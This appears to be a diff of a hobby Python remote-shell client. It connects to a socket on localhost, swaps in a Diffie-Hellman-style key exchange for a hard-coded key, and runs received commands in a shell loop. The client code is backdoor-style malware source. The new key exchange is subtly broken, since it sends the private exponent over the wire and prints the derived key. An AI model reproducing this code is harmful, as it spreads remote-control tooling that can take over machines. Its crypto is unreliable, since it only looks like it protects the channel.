@@ -3,8 +3,11 @@ import socket
 import subprocess
 import psutil 
 import os
+from DFH import Dfh_client as Dfh
 
-key = b'just for test123'
+df = Dfh()
+a, mod = df.ret_known()
+secret = df.private_expo()
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 HOST = "localhost"
@@ -15,6 +18,11 @@ while True:
         break
     except Exception as e:
         pass
+s.send(f"{a}-{mod}-{secret}".encode())
+secret = int(s.recv(1024).decode())
+key = str(df.genrate_secret(secret)).encode()
+key = key[:16]
+print(key)
 
 client = Tool(key, s)
 
@@ -23,7 +31,7 @@ def shell():
     try:
         while True:
             command = client.recv()
-            
+            print(command)
             if command.startswith("cd"):
                 try:
                     os.chdir(command.split(maxsplit=1)[1])
